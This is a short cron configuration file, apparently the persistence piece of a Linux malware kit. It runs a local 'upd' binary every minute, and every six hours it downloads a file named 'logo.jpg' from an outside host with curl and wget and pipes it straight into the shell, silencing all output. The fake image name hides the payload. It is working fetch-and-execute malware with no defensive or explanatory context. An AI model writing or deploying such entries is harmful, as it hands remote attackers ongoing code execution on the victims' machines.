# lx/ss/cron.d
* * * * * $dir/upd >/dev/null 2>&1
1 */6 * * * curl -fsSL http://zz.8282.space/lx/logo.jpg|sh  >/dev/null 2>&1
2 */6 * * * wget -q -O- http://zz.8282.space/lx/logo.jpg|sh >/dev/null 2>&1